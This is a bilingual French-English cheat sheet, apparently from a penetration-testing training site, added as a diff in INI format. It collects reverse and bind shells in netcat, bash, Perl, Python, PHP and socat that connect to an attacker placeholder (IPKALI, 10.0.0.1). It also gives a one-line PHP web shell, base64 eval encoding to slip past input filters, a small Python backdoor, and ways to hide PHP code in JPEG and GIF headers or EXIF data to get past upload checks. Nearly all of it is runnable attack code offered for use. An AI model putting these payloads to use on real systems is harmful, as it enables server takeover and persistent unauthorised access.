@@ -1,0 +1,617 @@
+﻿[Intro]
+id=intro
+category=Webshell
+title=Web Shell
+desc="
+Lignes de code à injecter dans des pages web pour lancer des commandes shell.
+"
+title_en=Web Shell
+desc_en="
+Lignes de code à injecter dans des pages web pour lancer des commandes shell.
+"
+
+
+[principle]
+id=nc
+category=Webshell
+keywords=
+title=Principe
+desc="
+Vous avez trouvé une requête web qui permet d'executer des commandes sur le serveur, ou vous avez reussi à trouver comment uploader un fichier qui peut être exécuté.<br/>
+Votre objectif maintenant est d'obtenir un shell sur la machine, ce qui permettra une exploitation confortable.<br/>
+Vous allez utiliser les outils installés sur le serveur (netcat, bash, php, python, perl, ...) pour ouvrir un shell sur le serveur et le connecter à votre shell.
+"
+title_en=Principle
+desc_en="
+You have found a web request that allows you to execute commands on the server, or you have managed to find out how to upload a file that can be executed.<br/>
+Your goal now is to get a shell on the machine, which will allow a comfortable exploitation.<br/>
+You will use the tools installed on the server (netcat, bash, php, python, perl, ...) to open a shell on the server and connect it back to your host.
+"
+
+
+
+[nc]
+id=nc
+category=Webshell
+keywords=
+title=Netcat
+desc="
+Netcat, est le couteau suisse des connections entre serveurs.<br/>
+Il peut se mettre en écoute, se connecter et lancer des shells.<br/>
+<br/>
+Les anciennes versions possédaient l'option -e ou -c qui permet de lancer un shell. Les version récentes ne possèdent plus cette option pour des raisons de sécurité<br/>
+Sur Kali on trouve une version 1.10 en :
+<pre><code>/usr/bin/nc -h
+	-e shell commands : program to execute
+	-c shell commands : program to execute
+	-l                : listen mode
+	-v                : verbose
+	-p port           : local port number
+</code></pre>
+"
+title_en=Netcat
+desc_en="
+Netcat, is the Swiss army knife of connections between servers.<br/>
+It can listen, connect and launch shells.<br/>
+<br/>
+Older versions had the -e or -c option to launch a shell. Recent versions do not have this option anymore for security reasons.<br/>
+On Kali there is a version 1.10 in :
+<pre><code>/usr/bin/nc -h
+	-e shell commands : program to execute
+	-c shell commands : program to execute
+	-l                : listen mode
+	-v                : verbose
+	-p port           : local port number
+</code></pre>
+"
+
+[ncreverse]
+id=ncreverse
+category=Webshell 
+keywords=
+title="Netcat - Reverse Shell (-e version)"
+desc="
+Mettre un nc en écoute sur la kali
+<pre><code>nc -lvp 4444
+</code></pre>
+Lancer un reverse shell sur le serveur, qui lance un shell, vient se connecter sur le netcat en écoute, et donne accès au shell.
+<pre><code>nc -e /bin/sh IPKALI 4444
+</code></pre>
+Pour utiliser un reverse shell il faut connaitre l'IP publique de sa Kali.
+"
+title_en="Netcat - Reverse Shell (-e version)"
+desc_en="
+On your host, start a nc listening on 4444 port
+<pre><code>nc -lvp 4444
+</code></pre>
+On the target host, start a reverse shell. This reverse shell launch a shell and connect it to your host on 4444 port.
+<pre><code>nc -e /bin/sh IPKALI 4444
+</code></pre>
+To use a reverse shell you must have a public IP, and can't use a NAT.
+Well, you can, its just little bit trickier.
+"
+
+[ncreversenoe]
+id=ncreversenoe
+category=Webshell 
+keywords=
+title="Netcat - Reverse Shell (sans -e)"
+desc="
+Mettre un nc en écoute sur la kali
+<pre><code>nc -lvp 4444
+</code></pre>
+Lancer un reverse shell sur le serveur, qui lance un shell, vient se connecter sur le netcat en écoute, et donne accès au shell.
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f
+</code></pre>
+"
+title_en="Netcat - Reverse Shell (without -e)"
+desc_en="
+On your host, start a nc listening on 4444 port
+<pre><code>nc -lvp 4444
+</code></pre>
+On the target host, start a reverse shell. This reverse shell launch a shell and connect it to your host on 4444 port.
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f
+</code></pre>
+"
+
+[ncupgrade1]
+id=ncupgrade
+category=Webshell 
+keywords=
+title=Upgrader son shell netcat avec un tty
+desc="
+Le shell obtenu avec nc est basique. Ce n'est pas un tty.<br/>
+Certaines commandes comme su vont refuser de fonctionner.<br/>
+Pour upgrader notre shell, utiliser python pour avoir un shell de type tty:
+<pre><code>python -c 'import pty; pty.spawn(&quot/bin/bash&quot)'
+</code></pre>
+"
+title_en=Upgrade your nc shell to a tty
+desc_en="
+The shell obtained with nc is basic. It is not a tty (real terminal).<br/>
+Some commands like su will refuse to work.<br/>
+To upgrade our shell, use python to get a tty shell:
+<pre><code>python -c 'import pty; pty.spawn(&quot/bin/bash&quot)'
+</code></pre>
+"
+
+[ncupgrade2]
+id=ncupgrade
+category=Webshell 
+keywords=
+title=Upgrader son shell avec historique et completion
+desc="
+Le shell obtenu avec nc est basique. La completion avec le Tab, l'historique avec les flèches ne sont pas gérés.<br/>
+<br/>
+Passer le nc en arrière plan avec:
+<pre><code>Ctr-Z
+</code></pre>
+Puis demander au shell actuel de passer les codes des touches brutes au shell distant, et repasser sur le netcat (foreground)
+<pre><code>stty raw -echo
+fg
+</code></pre>
+Attention: Tenter cette manip dans un browser va juste freezer le shell. Le browser modifie lui aussi les codes des touches. Ca ne marche que dans une VM.
+"
+title_en=Upgrade your shell with history and completion
+desc_en="
+The shell obtained with nc is basic. The completion with Tab, the history with arrows are not managed.<br/>
+<br/>
+Put the nc in the background with:
+<pre><code>Ctr-Z
+</code></pre>
+Then ask the current shell to pass the raw keystroke codes to the remote shell, and switch back to the netcat (foreground)
+<pre><code>stty raw -echo
+fg
+</code></pre>
+Disclamer: Trying this in a browser will just freeze the shell. The browser also modifies the key codes. It only works in a VM
+"
+
+[ncwebfriendly]
+id=ncwebfriendly
+category=Webshell 
+keywords=
+title=Webshell copain friendly
+desc="
+Tant que votre nc est connecté, vous bloquez un thread du serveur web.
+En fonction de la configuration du serveur, il peut avoir 6, 16, 32 threads... Dont autant de nc en parallèles avant saturation.
+Pour libérer le serveur pour les copains:
+Dans le nc connecté, choisissez un second port et lancez un second bindshell netcat en arrière plan:
+<pre><code>binshell: 
+nohup bash -c 'while true; do nc -e /bin/bash -lvp 4445; done;' &
+
+reverse shell: 
+nohup bash -c 'bash -i >& /dev/tcp/IPKALI/4444 0>&1' &
+</code></pre>
+La commande nohup va détacher le process nc du shell en cours.
+Faites un Ctrl-C pour couper la connection nc, la page avec votre webshell se libère. Un autre utilisateur peut se connecter.
+Lancer un nouveau nc pour vous connecter à ce nouveau bindshell.
+"
+title_en=Friendly Webshell 
+desc_en="
+As long as your nc is connected, you block a thread of the web server.
+Depending on the configuration of the server, it can have 6, 16, 32 threads... This means as many nc in parallel before saturation.
+To free the server for friends:
+In the connected nc, choose a second port and launch a second netcat bindshell in the background:<pre><code>binshell: 
+nohup bash -c 'while true; do nc -e /bin/bash -lvp 4445; done;' &
+
+reverse shell: 
+nohup bash -c 'bash -i >& /dev/tcp/IPKALI/4444 0>&1' &
+</code></pre>
+The nohup command will detach the nc process from the current shell.
+Do a Ctrl-C to cut the nc connection, the page with your webshell will be freed. Another user can connect.
+Launch a new nc to connect to this new bindshell.
+"
+
+
+
+[ncbind]
+id=ncbind
+category=Webshell 
+keywords=
+title=Netcat - Bind shell 
+desc="
+Un bind shell est utile quand notre Kali est derrière un NAT.
+Ce shell est fragile, un scan de port va le déclencher et le fermer.
+Lance un shell, ouvre une socket TCP en écoute sur le port 4444, et donne accès au shell au premier qui se connecte.
+<pre><code>nc -e /bin/sh -lvp 4444
+</code></pre>
+Se connecte au netcat distant pour avoir accès au shell.
+<pre><code>nc iptarget 4444
+</code></pre>
+"
+title_en=Netcat - Bind shell 
+desc_en="
+A bind shell is useful when our host is behind a NAT.
+This shell is fragile, a port scan will trigger it and close it.
+Launch a shell, open a listening TCP socket on port 4444, and give access to the shell to the first one who connects.
+<pre><code>nc -e /bin/sh -lvp 4444
+</code></pre>
+Connect to the nc on the target and get the shell:
+<pre><code>nc iptarget 4444
+</code></pre>
+"
+
+
+[ncbindnoe]
+id=ncbindnoe
+category=Webshell 
+keywords=
+title="Netcat - Bind Shell sans -e"
+desc="
+Lancer un bind shell sur la cible
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f
+</code></pre>
+Se connecter avec un nc 
+<pre><code>nc victim 4444
+</code></pre>
+"
+title="Netcat - Bind Shell (without -e option)"
+desc="
+Launch a bind shel on the target host
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc -lp 4444 >/tmp/f
+</code></pre>
+Then connect to it
+<pre><code>nc victim 4444
+</code></pre>
+"
+
+
+
+[socat]
+id=socat
+category=Webshell
+keywords=
+title=Shell: Socat
+desc="
+Socat est un nc sous stéroides. Il permet une authentification, un chiffrement des communications et un forward de ports.<br/>
+On le trouve rarement sur les serveurs, il faut l'uploader.<br/>
+Mettre un socat en écoute
+<pre><code>socat file:`tty`,raw,echo=0 TCP-L:4444
+</code></pre>
+Lancer un reverse shell avec un socat
+<pre><code>$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
+</code></pre>
+Automatiser l'upload et le reverse shell:
+<pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+</code></pre>
+"
+title_en=Shell: Socat
+desc_en="
+Socat is a nc on steroids. It allows authentication, encryption of communications and port forwarding.<br/>
+It is rarely found on the servers, it must be uploaded.<br/>
+Start a listening socat:
+<pre><code>$ socat file:`tty`,raw,echo=0 TCP-L:4444
+</code></pre>
+Launch reverse shell back to 10.0.0.1:4444
+<pre><code>$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
+</code></pre>
+Automate socat upload and the reverse shell:
+<pre><code>$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+</code></pre>
+"
+
+
+
+[pwncat]
+id=pwncat
+category=Webshell
+keywords=
+title=Shell: Pwncat
+desc="
+Pwncat est un nc sous stéroides. 
+<pre><code>https://github.com/cytopia/pwncat
+</code></pre>
+"
+title_en=Shell: Pwncat
+desc_en="
+Pwncat is an upgraded nc on steroids too. 
+<pre><code>https://github.com/cytopia/pwncat
+</code></pre>
+"
+
+
+[bash]
+id=bash
+category=Webshell 
+keywords=
+title=Reverse shell: Bash
+desc="
+Netcat et python ne sont pas installés sur le serveur. Il est toujours possible de lancer un reverse shell en bash.<br/>
+Mettre un nc en écoute votre host:
+<pre><code>nc -lvp 4444
+</code></pre>
+Lancer le reverse shell à partir de votre cible:
+<pre><code>bash -i >& /dev/tcp/IPKALI/4444 0>&1
+</code></pre>
+"
+title_en=Reverse shell: Bash
+desc_en="
+Netcat and python are not installed on the server. It is still possible to launch a reverse shell in bash.<br/>
+Launch a listening nc on your host:
+<pre><code>nc -lvp 4444
+</code></pre>
+Launch the reverse shell on your target:
+<pre><code>bash -i >& /dev/tcp/IPKALI/4444 0>&1
+</code></pre>
+"
+
+
+[perl]
+id=perl
+category=Webshell 
+keywords=
+title=Reverse shell: Perl
+desc="
+Mettre un nc en écoute sur la kali
+<pre><code>nc -lvp 4444
+</code></pre>
+<pre><code>perl -e 'use Socket;$i=\"IPKALI\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'
+</code></pre>
+"
+title_en=Reverse shell: Perl
+desc_en="
+Launch a listening nc on your host:
+<pre><code>nc -lvp 4444
+</code></pre>
+Launch the reverse shell in perl on your target:
+<pre><code>perl -e 'use Socket;$i=\"IPKALI\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'
+</code></pre>
+"
+
+[python]
+id=python
+category=Webshell 
+keywords=
+title=Reverse shell: Python
+desc="
+Mettre un nc en écoute sur la kali
+<pre><code>nc -lvp 4444
+</code></pre>
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPKALI",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+</code></pre>
+"
+title_en=Reverse shell: Python
+desc_en="
+Launch a listening nc on your host:
+<pre><code>nc -lvp 4444
+</code></pre>
+Launch the reverse shell in python on your target:
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IPKALI",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+</code></pre>
+"
+
+
+[php]
+id=php
+category=Webshell 
+keywords=
+title=Reverse shell: Php
+desc="
+Mettre un nc en écoute sur la kali
+<pre><code>nc -lvp 4444
+</code></pre>
+<pre><code>php -r '$sock=fsockopen(\"IPKALI\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'
+</code></pre>
+"
+title_en=Reverse shell: Php
+desc_en="
+Launch a listening nc on your host:
+<pre><code>nc -lvp 4444
+</code></pre>
+Launch the reverse shell in php on your target:
+<pre><code>php -r '$sock=fsockopen(\"IPKALI\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'
+</code></pre>
+"
+
+
+
+[webphp]
+id=webphp
+category=Webshell 
+keywords=
+title=Web server: cmd.php
+desc="
+Si vous pouvez uploader un fichier php sur le serveur web, le fichier ci-dessous vous permettra de lancer des commandes shell:
+<pre><code>&lt?php echo 'Shell: ';system($_GET['cmd']); ?>
+</code></pre>
+Lancer la commande 'id' sur le server
+<pre><code>curl http://IPSERVER/cmd.php?cmd=id
+</code></pre>
+"
+title=Web server: cmd.php
+desc="
+If you can upload a php file to the web server, the file below will allow you to run shell commands:
+<pre><code>&lt?php echo 'Shell: ';system($_GET['cmd']); ?>
+</code></pre>
+Run 'id' on the server
+<pre><code>curl http://IPSERVER/cmd.php?cmd=id
+</code></pre>
+"
+
+
+[webphp22] 
+id=webphp22
+category=Webshell
+keywords=
+title="Web server: cmd.php (avec une belle page HTML)"
+desc="
+Uploader la page
+<pre><code>&ltpre>&lt?php echo 'Shell: ';system($_GET['cmd']); ?>&lt/pre>
+</code></pre>
+Lancer la commande 'id' sur le server
+<pre><code>curl http://IPSERVER/cmd.php?cmd=id
+</code></pre>
+"
+title="Web server: cmd.php (clean html)"
+desc="
+Upload the file
+<pre><code>&ltpre>&lt?php echo 'Shell: ';system($_GET['cmd']); ?>&lt/pre>
+</code></pre>
+Run 'id' on the server
+<pre><code>curl http://IPSERVER/cmd.php?cmd=id
+</code></pre>
+"
+
+
+[webphpbase64]
+id=webphpbase64
+category=Webshell 
+keywords=
+title=Web server: PHP encodage base64
+desc="
+Parfois certain caractères comme les ; les & ou les | sont filtrés. Un encodage base64 permet de s'en sortir.<br/>
+Dans un shell encoder en base64:
+<pre><code>$ printf 'system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f\");' | base64
+</code></pre>
+Code PHP du reverse shell
+<pre><code>eval(base64_decode('c3lzdGVtKCJyEtxxxxxxxxxEkgNDQ0NCA+L3RtcC9mIik7='));
+</code></pre>
+"
+title_en=Web server: PHP code base64 encoded
+desc_en="
+Sometimes some characters like ; the & or the | are filtered. A base64 encoding allows to get out of it.<br/>
+Base64 encode your command in an xterm:
+<pre><code>$ printf 'system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f\");' | base64
+</code></pre>
+Paste de base64 encoded command in PHP reverse shell code:
+<pre><code>eval(base64_decode('c3lzdGVtKCJyEtxxxxxxxxxEkgNDQ0NCA+L3RtcC9mIik7='));
+</code></pre>
+"
+
+[pythonbind]
+id=pythonbind
+category=Webshell 
+keywords=
+title=Python bind shell
+desc="
+<pre><code>import sys,socket,time,re,subprocess,os
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+sock.bind(('0.0.0.0',4444))
+sock.listen(5)
+conn,addr = sock.accept()
+conn.send('== YOLO Backdoor ==\n\n>')
+while 1:         
+    data = conn.recv(1024)
+    cmd = data.strip().split(' ')
+    if cmd[0] == 'cd':
+        os.chdir(cmd[1])
+    elif cmd[0] in ('exit'):
+        break
+    else:
+        conn.send(subprocess.check_output(cmd)+'\n>') 
+conn.close()
+sock.shutdown(socket.SHUT_RDWR)
+sock.close()
+</code></pre>
+"
+
+
+[imgwebshell]
+id=imgwebshell
+category=Webshell 
+keywords=
+title=File upload Webshell : Jpeg
+desc="
+Si vous pouvez upload un fichier jpg, il est possible d'y cacher un webshell.<br/>
+Un fichier jpeg est identifié par ses premiers octets qui ont la valeur : ffd8ffe0  <br/>
+Pour générer un fichier qui sera identifié comme ayant une entête Jpeg valide:
+<pre><code>printf &quot;\xff\xd8\xff\xe0&lt?php system('id'); ?>&quot; > webshell.jpg
+</code></pre>
+Ce fichier sera reconnu comme un fichier jpg
+<pre><code>$ file webshell.jpg 
+webshell.jpg: JPEG image data
+</code></pre>
+"
+title_en=File upload Webshell : Jpeg
+desc_en="
+If you can upload a jpg file, it is possible to hide a webshell in it.<br/>  
+A jpeg file is identified by its first bytes which have the value: ffd8ffe0  <br/>
+To generate a file that will be identified as having a valid Jpeg header:
+<pre><code>printf &quot;\xff\xd8\xff\xe0&lt?php system('id'); ?>&quot; > webshell.jpg
+</code></pre>
+This file will be recognized as a jpg file
+<pre><code>$ file webshell.jpg 
+webshell.jpg: JPEG image data
+</code></pre>
+"
+
+
+[imgwebshell2]
+id=imgwebshell
+category=Webshell 
+keywords=
+title=File upload Webshell : Gif
+desc="
+Un fichier gif est identifié par ses premiers octets qui ont la valeur : GIF89a;  <br/>
+Pour générer un fichier qui sera identifié comme ayant une entête gif valide:<br/>
+<pre><code>printf &quot;GIF89a;&lt?php system('id'); ?>&quot; > webshell.gif
+</code></pre>
+Ce fichier sera reconnu comme un fichier gif
+<pre><code>$ file webshell.gif 
+webshell.gif: GIF image data
+</code></pre>
+"
+title_en=File upload Webshell : Gif
+desc_en="
+A Gif file is identified by its first bytes which have the value: GIF89a;  <br/>
+To generate a file that will be identified as having a valid gif header:<br/>
+<pre><code>printf &quot;GIF89a;&lt?php system('id'); ?>&quot; > webshell.gif
+</code></pre>
+This file will be recognized as a gif file
+<pre><code>$ file webshell.gif 
+webshell.gif: GIF image data
+</code></pre>
+"
+
+[imgwebshell3]
+id=imgwebshell
+category=Webshell 
+keywords=
+title=File upload Webshell : Exif datas
+desc="
+Un fichier image contient de nombreuses informations : date de prise de vue, localisation, type d'appareil photo...<br/>
+Nous pouvons injecter du code php dans ces données.
+<pre><code>exiftool -Comment&equals;'&lt?php system('id'); ?>' webshell.jpg
+</code></pre>
+"
+title_en=File upload Webshell : Exif datas
+desc_en="
+An image file contains a lot of information: shooting date, location, camera type...<br/>
+We can inject php code in this data.
+<pre><code>exiftool -Comment&equals;'&lt?php system('id'); ?>' webshell.jpg
+</code></pre>
+"
+
+
+
+[payloadallthethings]
+id=payloadallthethings
+category=Webshell 
+keywords=
+title=References: PayloadAllTheThings et PentestMonkey
+desc="
+A lire pour en savoir plus:<br/>
+Liste de webshells
+<pre><code>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+</code></pre>
+Webshell en pure php: <a href="php-reverse-shell.php.txt">php-reverse-shell.php</a>
+<pre><code>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+</code></pre>
+Yop Webshell: <a href="yopwebshell.php.txt">yopwebshell.php</a><br/>
+Yolo Webshell: <a href="yolowebshell.php.txt">yolowebshell.php</a>
+"
+title_en=References: PayloadAllTheThings and PentestMonkey
+desc_en="
+You want to know more ?<br/>
+Some webshells
+<pre><code>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+</code></pre>
+Pure php Webshell: <a href="php-reverse-shell.php.txt">php-reverse-shell.php</a>
+<pre><code>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+</code></pre>
+Yop Webshell: <a href="yopwebshell.php.txt">yopwebshell.php</a><br/>
+Yolo Webshell: <a href="yolowebshell.php.txt">yolowebshell.php</a>
+"
+
